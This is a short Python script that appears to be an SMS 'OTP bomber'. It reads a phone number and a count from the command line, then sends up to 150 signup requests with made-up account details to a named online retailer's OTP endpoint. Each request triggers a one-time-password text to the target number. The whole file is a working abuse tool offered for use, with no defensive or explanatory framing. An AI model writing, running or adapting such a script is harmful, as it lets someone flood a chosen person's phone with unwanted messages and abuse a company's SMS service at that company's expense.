import requests 
import sys

mono = sys.argv[1]
count = sys.argv[2]


data = {'firstName':'mashino','login':'randommail@gmail.com','password':'Someone!123','genderType':'Male','mobileNumber':mono,'requestType':'SENDOTP'}
        
if int(count)<=150:
    for i in range(int(count)):
        response = requests.post('https://login.web.ajio.com/api/auth/signupSendOTP', data=data)
        print(int(i+1))
else:
    print("Limit is 150")
